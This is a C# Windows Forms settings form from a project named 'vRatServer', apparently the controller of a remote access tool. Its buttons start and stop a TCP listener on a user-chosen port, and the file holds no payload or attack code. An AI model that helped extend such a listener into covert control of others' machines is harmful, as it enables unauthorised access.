using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using vRatServer.Classes;

namespace vRatServer.Forms
{
    public partial class SettingsForm : Form
    {
        Form parent;
        static TcpServer srv=null;
        public SettingsForm(Form parent)
        {
            this.parent = parent;
            InitializeComponent();
        }

        private void SettingsForm_Resize(object sender, EventArgs e)
        {
            int x = (this.Width - panel1.Width) / 2;
            int y = (this.Height - panel1.Height) / 2;
            panel1.Location = new Point(x, y);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            var f = (MainForm)parent;
            f.changeStatus(true, (ushort)numericUpDown1.Value);
            button1.Enabled = false;
            button2.Enabled = true;
            if (srv != null)
            {
                srv.Stop();
            }
            srv = new TcpServer((int)numericUpDown1.Value);
            srv.Start();

        }

        private void button2_Click(object sender, EventArgs e)
        {
            var f = (MainForm)parent;
            f.changeStatus(false, (ushort)numericUpDown1.Value);
            button1.Enabled = true;
            button2.Enabled = false;
            if (srv != null)
            {
                srv.Stop();
            }
        }

        private void SettingsForm_Load(object sender, EventArgs e)
        {

        }
    }
}
